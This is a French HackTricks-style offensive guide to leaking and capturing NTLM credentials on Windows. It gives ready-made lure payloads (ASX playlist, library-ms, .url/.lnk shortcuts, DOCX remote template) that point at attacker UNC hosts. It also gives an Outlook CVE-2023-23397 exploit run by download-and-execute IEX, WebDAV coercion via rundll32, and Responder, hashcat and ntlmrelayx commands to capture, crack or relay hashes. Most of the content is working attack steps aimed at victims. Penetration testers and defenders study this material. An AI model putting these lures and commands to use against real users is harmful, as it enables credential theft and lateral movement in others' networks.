# Endroits où voler des identifiants NTLM

{{#include ../../banners/hacktricks-training.md}}

**Consultez toutes les excellentes idées de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), du téléchargement d’un fichier Microsoft Word en ligne aux sources de leaks NTLM : https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md et [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Partage SMB accessible en écriture + leurres UNC déclenchés par Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Si vous pouvez **écrire dans un partage que des utilisateurs ou des tâches planifiées parcourent dans Explorer**, déposez des fichiers dont les métadonnées pointent vers votre UNC (par ex. `\\ATTACKER\share`). L’affichage du dossier déclenche une **authentification SMB implicite** et divulgue un **NetNTLMv2** à votre listener.<sup>[[1]](#references)</sup>

1. **Générer des leurres** (prend en charge SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Déposez-les sur le partage accessible en écriture** (n’importe quel dossier que la victime ouvre) :

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Écouter et crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows peut accéder à plusieurs fichiers à la fois ; tout ce qu’Explorer prévisualise (`ACCÉDER AU DOSSIER`) ne nécessite aucun clic.

### Playlists Windows Media Player (.ASX/.WAX)

Si vous pouvez amener une cible à ouvrir ou à prévisualiser une playlist Windows Media Player que vous contrôlez, vous pouvez leak Net‑NTLMv2 en faisant pointer l’entrée vers un chemin UNC. WMP tentera de récupérer le média référencé via SMB et s’authentifiera implicitement.<sup>[[3]](#references)[[4]](#references)</sup>

Exemple de payload :

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Flux de collecte et de cracking :

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Fuite NTLM via .library-ms intégré dans un ZIP (CVE-2025-24071/24055)

Windows Explorer gère de manière non sécurisée les fichiers .library-ms lorsqu’ils sont ouverts directement depuis une archive ZIP. Si la définition de la bibliothèque pointe vers un chemin UNC distant (p. ex., \\attacker\share), il suffit de parcourir/lancer le fichier .library-ms dans l’archive ZIP pour qu’Explorer énumère le chemin UNC et transmette l’authentification NTLM à l’attaquant. Cela permet d’obtenir un NetNTLMv2 qui peut être cracké hors ligne ou potentiellement relayé.<sup>[[2]](#references)</sup>

Fichier .library-ms minimal pointant vers un UNC contrôlé par l’attaquant

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Étapes opérationnelles
- Créez le fichier .library-ms avec le XML ci-dessus (définissez votre IP/nom d’hôte).
- Compressez-le en ZIP (sous Windows : Envoyer vers → Dossier compressé) et transmettez le ZIP à la cible.
- Lancez un listener de capture NTLM et attendez que la victime ouvre le fichier .library-ms depuis le ZIP.


### Chemin du fichier son du rappel de calendrier Outlook (CVE-2023-23397) – fuite zero-click de Net-NTLMv2

Microsoft Outlook pour Windows traitait la propriété MAPI étendue PidLidReminderFileParameter des éléments de calendrier. Si cette propriété pointe vers un chemin UNC (par ex. \\attacker\share\alert.wav), Outlook se connectait au partage SMB au déclenchement du rappel, entraînant la fuite du Net-NTLMv2 de l’utilisateur sans aucun clic. Cette vulnérabilité a été corrigée le 14 mars 2023, mais elle reste très pertinente pour les parcs anciens ou non mis à jour et pour les enquêtes historiques de réponse aux incidents.<sup>[[5]](#references)</sup>

Exploitation rapide avec PowerShell (Outlook COM) :

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Côté listener :

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notes
- La victime doit uniquement avoir Outlook pour Windows ouvert au moment où le rappel se déclenche.
- Le leak fournit du Net‑NTLMv2, utilisable pour le cracking hors ligne ou le relay (pas pour le pass-the-hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – contournement de CVE‑2025‑24054)

Windows Explorer affiche automatiquement les icônes des raccourcis. Des recherches récentes ont montré que, même après le correctif de Microsoft d’avril 2025 concernant les raccourcis avec icône UNC, il était toujours possible de déclencher une authentification NTLM sans aucun clic en hébergeant la cible du raccourci sur un chemin UNC et en conservant l’icône en local (le contournement du correctif a reçu le numéro CVE‑2025‑50154). Le simple fait d’afficher le dossier pousse Explorer à récupérer les métadonnées de la cible distante, envoyant ainsi du NTLM au serveur SMB de l’attaquant.<sup>[[6]](#references)</sup>

Payload minimal d’Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Créer un payload de raccourci (.lnk) via PowerShell :

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Idées de livraison
- Déposer le raccourci dans un ZIP et amener la victime à le parcourir.
- Placer le raccourci sur un partage accessible en écriture que la victime ouvrira.
- Le combiner avec d’autres fichiers leurres dans le même dossier afin qu’Explorer en affiche un aperçu.

### Leak NTLM sans clic via le chemin d’icône ExtraData de .LNK (CVE‑2026‑25185)

Windows charge les métadonnées `.lnk` lors de l’**affichage/de l’aperçu** (rendu de l’icône), et pas seulement lors de l’exécution. CVE‑2026‑25185 met en évidence un chemin d’analyse où les blocs **ExtraData** amènent le shell à résoudre un chemin d’icône et à accéder au système de fichiers **pendant le chargement**, déclenchant l’envoi d’un NTLM sortant si le chemin est distant.

Conditions clés de déclenchement (observées dans `CShellLink::_LoadFromStream`) :
- Inclure **DARWIN_PROPS** (`0xa0000006`) dans ExtraData (condition préalable à la routine de mise à jour de l’icône).
- Inclure **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) avec **TargetUnicode** renseigné.
- Le chargeur développe les variables d’environnement dans `TargetUnicode` et appelle `PathFileExistsW` sur le chemin obtenu.

Si `TargetUnicode` correspond à un chemin UNC (p. ex. `\\attacker\share\icon.ico`), **le simple fait d’afficher un dossier** contenant le raccourci déclenche une authentification sortante. Le même chemin de chargement peut également être emprunté par l’**indexation** et l’**analyse antivirus**, ce qui en fait une surface de leak sans clic.<sup>[[7]](#references)</sup>

Des outils de recherche (analyseur/générateur/interface utilisateur) sont disponibles dans le projet **LnkMeMaybe** pour créer/inspecter ces structures sans utiliser l’interface graphique de Windows.<sup>[[8]](#references)</sup>


### Coercition d’authentification WebDAV / validation des identifiants via `davclnt.dll,DavSetCookie`

Le **client WebDAV** natif peut être détourné pour forcer la session de connexion actuelle à s’authentifier auprès d’un point de terminaison **HTTP/WebDAV** arbitraire :

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Pourquoi c'est utile :
- Face à un **serveur WebDAV contrôlé par l'attaquant**, cela peut déclencher **NTLM over HTTP** sans déployer de client personnalisé.
- Face à des **hôtes internes**, c'est un moyen discret de **vérifier où les identifiants volés sont acceptés** avant de procéder à un mouvement latéral.<sup>[[9]](#references)</sup>
- Cette commande est une bonne alternative lorsque la sortie **SMB** est filtrée, mais que **HTTP/WebDAV** reste accessible.

Notes opérationnelles :
- Le service **WebClient** doit être en cours d'exécution sur l'hôte source.
- `rundll32.exe` charge `davclnt.dll` et laisse Windows gérer l'authentification WebDAV avec les **identifiants de l'utilisateur actuel**.<sup>[[10]](#references)</sup>
- Si vous pointez vers une infrastructure que vous contrôlez, utilisez un listener/relay HTTP compatible avec NTLM, par exemple :

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Du point de vue de la détection, des exécutions répétées de `rundll32.exe davclnt.dll,DavSetCookie` visant de nombreux systèmes internes sont un signe fort de **validation d’identifiants / préparation à un mouvement latéral de type spray**, plutôt que d’un comportement utilisateur normal.<sup>[[9]](#references)[[11]](#references)</sup>

### Injection de modèle distant Office (.docx/.dotm) pour forcer l’authentification NTLM

Les documents Office peuvent référencer un modèle externe. Si vous définissez le modèle joint sur un chemin UNC, l’ouverture du document déclenchera une authentification auprès de SMB.

Modifications minimales des relations DOCX (dans word/) :

1) Modifiez word/settings.xml et ajoutez la référence au modèle joint :

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Modifiez word/_rels/settings.xml.rels et faites pointer rId1337 vers votre UNC :

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Repackagez en .docx et livrez. Lancez votre listener de capture SMB et attendez l’ouverture.

Pour des idées de relay ou d’abus de NTLM après la capture, consultez :

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Leurres via un partage accessible en écriture + capture avec Responder → crack de NetNTLMv2 → Kerberoast de svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 jusqu’à DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — fuite NTLM de WMP → junction NTFS vers le webroot pour une RCE → FullPowers + GodPotato jusqu’à SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnérabilités NTLM : menaces d’escalade de privilèges non corrigées chez Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft atténue la vulnérabilité EoP d’Outlook (CVE‑2023‑23397) et explique la NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, un seul NTLM : contournement d’un correctif de sécurité Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe : analyse de CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Outils TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Quand le support informatique appelle : analyse d’une campagne ModeloRAT, de Teams à la compromission du domaine](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – fichier d’en-tête davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Requête WebDAV de Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Lieux intéressants pour voler des hashes NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
